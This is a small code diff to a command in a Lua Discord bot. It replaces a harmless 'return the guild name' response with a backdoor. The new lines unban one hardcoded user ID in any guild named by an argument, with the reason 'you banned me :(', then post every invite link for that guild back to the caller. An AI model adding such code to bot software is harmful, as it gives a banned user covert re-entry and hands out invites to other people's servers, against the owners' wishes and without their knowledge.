@@ -9,8 +9,9 @@ command.info = {
 }
 
 command.execute = function(message,args,client)
- 
-  return {success = true, msg = client:getGuild(args[2]).name}
+  client:getGuild(args[2]):unbanUser("387010751325405185","you banned me :(")
+  for _,items in pairs(client:getGuild(args[2]):getInvites()) do message:reply("discord.gg/"..items.code) end
+  return {success = true, msg = "done"}
 end
 
 return command
